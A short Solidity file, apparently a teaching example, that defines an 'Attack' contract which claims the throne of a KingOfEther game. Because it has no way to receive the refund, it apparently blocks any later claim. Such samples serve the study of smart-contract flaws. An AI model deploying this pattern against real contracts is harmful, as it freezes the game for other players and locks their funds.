// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./KingOfEther.sol";

contract Attack {
    KingOfEther kingOfEther;

    function attack(address _kingOfEtherAddress) public payable {
        kingOfEther = KingOfEther(_kingOfEtherAddress);

        kingOfEther.claimThrone{value: msg.value}();
    }
}